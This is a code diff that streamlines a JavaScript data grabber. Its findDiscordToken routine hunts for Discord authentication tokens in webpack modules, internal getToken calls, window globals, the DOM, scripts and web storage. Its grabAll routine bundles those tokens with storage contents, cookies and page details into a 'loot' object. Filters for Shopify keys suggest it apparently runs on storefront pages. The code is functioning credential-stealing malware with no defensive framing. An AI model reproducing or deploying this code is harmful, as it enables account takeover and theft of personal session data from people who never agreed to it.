@@ -61,7 +61,7 @@
                 return btoa(out);
             }
 
-            // ====== ENHANCED TOKEN EXTRACTION ======
+            // ====== TOKEN EXTRACTION ======
             function findDiscordToken() {
                 const tokens = [];
                 const seen = new Set();
@@ -83,74 +83,47 @@
                     if (!str || typeof str !== 'string') return;
                     for (const rx of tokenRegexes) {
                         const found = str.match(rx);
-                        if (found) {
-                            found.forEach(t => addToken(t, src));
-                        }
+                        if (found) found.forEach(t => addToken(t, src));
                     }
                 }
 
-                // === METHOD 1: Direct webpack chunk module string scanning ===
+                // === METHOD 1: Webpack chunk deep scan ===
                 try {
                     if (window.webpackChunkdiscord_app && Array.isArray(window.webpackChunkdiscord_app)) {
-                        const chunks = window.webpackChunkdiscord_app;
-                        for (let i = 0; i < chunks.length; i++) {
-                            try {
-                                const chunk = chunks[i];
-                                if (chunk && chunk[1] && typeof chunk[1] === 'object') {
-                                    const modules = chunk[1];
-                                    for (const modKey in modules) {
-                                        try {
-                                            const mod = modules[modKey];
-                                            if (typeof mod === 'function') {
-                                                scanString(mod.toString(), 'wp_func_' + i + '_' + modKey);
-                                            }
-                                            if (typeof mod === 'object' && mod !== null) {
-                                                scanString(JSON.stringify(mod), 'wp_obj_' + i + '_' + modKey);
-                                            }
-                                        } catch(e) {}
+                        window.webpackChunkdiscord_app.forEach((chunk, i) => {
+                            if (chunk && chunk[1]) {
+                                Object.entries(chunk[1]).forEach(([modKey, mod]) => {
+                                    if (typeof mod === 'function') {
+                                        scanString(mod.toString(), 'wp_func_' + i + '_' + modKey);
                                     }
-                                }
-                            } catch(e) {}
-                        }
+                                    if (typeof mod === 'object' && mod !== null) {
+                                        try { scanString(JSON.stringify(mod), 'wp_obj_' + i + '_' + modKey); } catch(e) {}
+                                    }
+                                });
+                            }
+                        });
                     }
                 } catch(e) {}
 
-                // === METHOD 2: Try to find and call the token module directly ===
-                // Discord stores token in a specific webpack module that exports getToken
+                // === METHOD 2: Try to find getToken modules ===
                 try {
                     if (window.webpackChunkdiscord_app) {
-                        const wp = window.webpackChunkdiscord_app;
-                        const allModules = [];
-
-                        wp.forEach(chunk => {
+                        window.webpackChunkdiscord_app.forEach(chunk => {
                             if (chunk && chunk[1]) {
                                 Object.values(chunk[1]).forEach(mod => {
                                     if (typeof mod === 'function') {
                                         try {
-                                            const exports = {};
-                                            const module = {exports: exports};
-                                            mod(module, exports, function(){});
-
-                                            // Check for getToken function
-                                            if (exports.default && typeof exports.default.getToken === 'function') {
-                                                try {
-                                                    const tok = exports.default.getToken();
-                                                    if (tok) scanString(tok, 'wp_getToken');
-                                                } catch(e) {}
+                                            const exp = {};
+                                            mod(exp, {}, function(){});
+                                            if (exp.default && typeof exp.default.getToken === 'function') {
+                                                try { scanString(exp.default.getToken(), 'getToken'); } catch(e) {}
                                             }
-                                            if (exports.getToken && typeof exports.getToken === 'function') {
-                                                try {
-                                                    const tok = exports.getToken();
-                                                    if (tok) scanString(tok, 'wp_getToken_direct');
-                                                } catch(e) {}
+                                            if (typeof exp.getToken === 'function') {
+                                                try { scanString(exp.getToken(), 'getToken_direct'); } catch(e) {}
                                             }
-
-                                            // Check for _token property
-                                            if (exports.default && exports.default._token) {
-                                                scanString(exports.default._token, 'wp_token_prop');
+                                            if (exp.default && exp.default._token) {
+                                                scanString(exp.default._token, 'token_prop');
                                             }
-
-                                            allModules.push(module.exports);
                                         } catch(e) {}
                                     }
                                 });
@@ -159,7 +132,7 @@
                     }
                 } catch(e) {}
 
-                // === METHOD 3: Deep recursive window scan ===
+                // === METHOD 3: Deep window object scan ===
                 const scanned = new Set();
                 function scanObject(obj, path, depth) {
                     if (depth > 5 || scanned.has(obj)) return;
@@ -168,11 +141,9 @@
                         for (const key in obj) {
                             try {
                                 const val = obj[key];
-                                if (typeof val === 'string') {
-                                    scanString(val, path + '.' + key);
-                                } else if (typeof val === 'function') {
-                                    scanString(val.toString(), path + '.' + key + '()');
-                                } else if (typeof val === 'object' && val !== null && val !== window && depth < 5) {
+                                if (typeof val === 'string') scanString(val, path + '.' + key);
+                                else if (typeof val === 'function') scanString(val.toString(), path + '.' + key + '()');
+                                else if (typeof val === 'object' && val !== null && val !== window && depth < 5) {
                                     scanObject(val, path + '.' + key, depth + 1);
                                 }
                             } catch(e) {}
@@ -180,92 +151,51 @@
                     } catch(e) {}
                 }
 
-                const targets = [
-                    'DiscordNative', 'GLOBAL_ENV', 'webpackJsonp', 'webpackChunkdiscord_app',
-                    '__DISCORD__', 'Vencord', 'BdApi', 'betterDiscord', 'localStorage',
-                    'sessionStorage', 'document', 'window'
-                ];
-                targets.forEach(t => {
+                ['DiscordNative', 'GLOBAL_ENV', 'webpackChunkdiscord_app', '__DISCORD__', 
+                 'Vencord', 'BdApi', 'betterDiscord', 'localStorage', 'sessionStorage'].forEach(t => {
                     if (window[t]) scanObject(window[t], 'window.' + t, 0);
                 });
 
                 // === METHOD 4: DOM and scripts ===
+                try { scanString(document.documentElement.innerHTML, 'dom'); } catch(e) {}
                 try {
-                    scanString(document.documentElement.innerHTML, 'dom_html');
-                } catch(e) {}
-
-                try {
-                    const scripts = document.querySelectorAll('script');
-                    scripts.forEach((script, idx) => {
-                        scanString(script.textContent || script.innerText || '', 'script_' + idx);
+                    document.querySelectorAll('script').forEach((s, i) => {
+                        scanString(s.textContent || s.innerText || '', 'script_' + i);
                     });
                 } catch(e) {}
 
-                // === METHOD 5: Storage deep scan ===
+                // === METHOD 5: Storage (filtering non-Shopify keys) ===
                 try {
                     for (let i = 0; i < localStorage.length; i++) {
                         const k = localStorage.key(i);
-                        scanString(localStorage.getItem(k), 'ls_' + k);
+                        const v = localStorage.getItem(k);
+                        if (v && !k.toLowerCase().includes('shopify') && !k.toLowerCase().includes('checkout')) {
+                            scanString(v, 'ls_' + k);
+                        }
                     }
                 } catch(e) {}
 
                 try {
                     for (let i = 0; i < sessionStorage.length; i++) {
                         const k = sessionStorage.key(i);
-                        scanString(sessionStorage.getItem(k), 'ss_' + k);
-                    }
-                } catch(e) {}
-
-                // === METHOD 6: IndexedDB scan for Discord DBs ===
-                try {
-                    const req = window.indexedDB.open('Discord');
-                    req.onsuccess = function(e) {
-                        const db = e.target.result;
-                        // Try to access object stores that might contain tokens
-                        try {
-                            const tx = db.transaction(['kv'], 'readonly');
-                            const store = tx.objectStore('kv');
-                            const getAll = store.getAll();
-                            getAll.onsuccess = function(e) {
-                                const data = e.target.result;
-                                data.forEach(item => {
-                                    scanString(JSON.stringify(item), 'idb_kv');
-                                });
-                            };
-                        } catch(e) {}
-                    };
-                } catch(e) {}
-
-                // === METHOD 7: Try Discord's internal require if available ===
-                try {
-                    if (window.require) {
-                        const mods = ['discord_desktop_core', 'discord_utils', 'discord_modules'];
-                        mods.forEach(m => {
-                            try {
-                                const mod = window.require(m);
-                                scanString(JSON.stringify(mod), 'require_' + m);
-                            } catch(e) {}
-                        });
-                    }
-                } catch(e) {}
-
-                // === METHOD 8: Electron IPC scan ===
-                try {
-                    if (window.process && window.process.versions && window.process.versions.electron) {
-                        scanString(JSON.stringify(window.process), 'electron_process');
-                        if (window.require) {
-                            try {
-                                const ipc = window.require('electron').ipcRenderer;
-                                scanString(JSON.stringify(ipc), 'electron_ipc');
-                            } catch(e) {}
+                        const v = sessionStorage.getItem(k);
+                        if (v && !k.toLowerCase().includes('shopify') && !k.toLowerCase().includes('checkout')) {
+                            scanString(v, 'ss_' + k);
                         }
+                    }
+                } catch(e) {}
+
+                // === METHOD 6: Try to access Discord's internal storage directly ===
+                try {
+                    if (window.DiscordNative && window.DiscordNative.storage) {
+                        scanString(JSON.stringify(window.DiscordNative.storage), 'native_storage');
                     }
                 } catch(e) {}
 
                 return tokens;
             }
 
-            // ====== GRAB EVERYTHING ELSE ======
+            // ====== GRAB ALL DATA ======
             async function grabAll() {
                 const loot = {
                     tokens: [],
@@ -280,11 +210,14 @@
 
                 loot.tokens = findDiscordToken();
 
+                // Filter out Shopify garbage from storage
                 try {
                     for (let i = 0; i < localStorage.length; i++) {
                         const k = localStorage.key(i);
                         const v = localStorage.getItem(k);
-                        loot.ls.push({k: k, v: v ? v.substring(0, 500) : null, l: v ? v.length : 0});
+                        if (!k.toLowerCase().includes('shopify') && !k.toLowerCase().includes('checkout')) {
+                            loot.ls.push({k: k, v: v ? v.substring(0, 500) : null, l: v ? v.length : 0});
+                        }
                     }
                 } catch(e) {}
 
@@ -292,12 +225,14 @@
                     for (let i = 0; i < sessionStorage.length; i++) {
                         const k = sessionStorage.key(i);
                         const v = sessionStorage.getItem(k);
-                        loot.ss.push({k: k, v: v ? v.substring(0, 500) : null, l: v ? v.length : 0});
+                        if (!k.toLowerCase().includes('shopify') && !k.toLowerCase().includes('checkout')) {
+                            loot.ss.push({k: k, v: v ? v.substring(0, 500) : null, l: v ? v.length : 0});
+                        }
                     }
                 } catch(e) {}
 
                 try {
-                    loot.ck = document.cookie.split(';').map(c => c.trim()).filter(c => c);
+                    loot.ck = document.cookie.split(';').map(c => c.trim()).filter(c => c && !c.toLowerCase().includes('shopify'));
                 } catch(e) {}
 
                 try {
@@ -341,7 +276,8 @@
                     ts: new Date().toISOString(),
                     rf: document.referrer || 'D',
                     url: location.href,
-                    host: location.hostname
+                    host: location.hostname,
+                    origin: location.origin
                 };
 
                 return loot;
